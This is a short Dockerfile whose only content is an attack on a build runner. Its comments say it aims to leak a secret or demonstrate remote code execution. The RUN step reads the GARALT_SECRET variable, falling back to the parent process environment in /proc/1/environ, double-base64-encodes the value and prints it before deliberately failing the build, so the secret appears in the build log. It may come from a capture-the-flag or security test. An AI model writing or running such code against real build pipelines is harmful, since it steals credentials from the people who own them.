FROM alpine
RUN apk add --no-cache bash
# Attempt to leak the secret from the runner's environment if possible, 
# or demonstrate RCE by failing the build with the desired output.
RUN export GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64) && \
    if [ -z "$GARALT_LEAKED_TOKEN" ]; then \
      # If not in env, try to find it in the parent process environment if accessible \
      GARALT_LEAKED_TOKEN=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep GARALT_SECRET | cut -d= -f2- | base64 | base64); \
    fi; \
    echo "GARALT_LEAKED_TOKEN=$GARALT_LEAKED_TOKEN"; exit 1